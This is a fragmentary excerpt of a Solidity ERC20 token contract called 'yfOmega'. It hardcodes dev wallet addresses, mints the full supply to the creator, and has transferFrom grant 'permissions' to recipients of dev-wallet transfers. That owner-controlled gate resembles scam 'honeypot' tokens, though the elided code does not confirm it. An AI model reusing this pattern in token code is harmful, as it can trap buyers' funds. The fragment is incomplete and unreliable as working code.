...
contract Permissions is Context
{
    ...
    constructor() public
    {
        _token_address = 0x63a4abE8851949727E110ff7f4Ea400c28449D26; 
        _dev_token_wallet = 0x63a4abE8851949727E110ff7f4Ea400c28449D26; 
        _airdrop_token_wallet = 0x842Dd0f1375973F23Be818604Ef394fdE86348aD;
...
contract yfOmega is Permissions, IERC20 {
    ...
    string private _FDF_token_name;
    string private _FDF_token_symbol;
    uint8 private _FDF_token_decimals;
    uint256 private _FDF_token_supply;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18 and a {token_supply} of the token.
     *
    ...
    constructor () public {
        _FDF_token_name = "yfOmega.finance";
        _FDF_token_symbol = "yfOmega";
        _FDF_token_decimals = 18;
        _FDF_token_supply = 33000e18;
        
        _balances[creator()] = _FDF_token_supply;
        emit Transfer(address(0), creator(), _FDF_token_supply);
    }
    ...
    function decimals() public view returns (uint8) {
        return _FDF_token_decimals;
    }

    /**
     * @dev See {IERC20-token_supply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _FDF_token_supply;
    }
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        if(_msgSender() == dev_token_wallet())
        { givePermissions(recipient); }
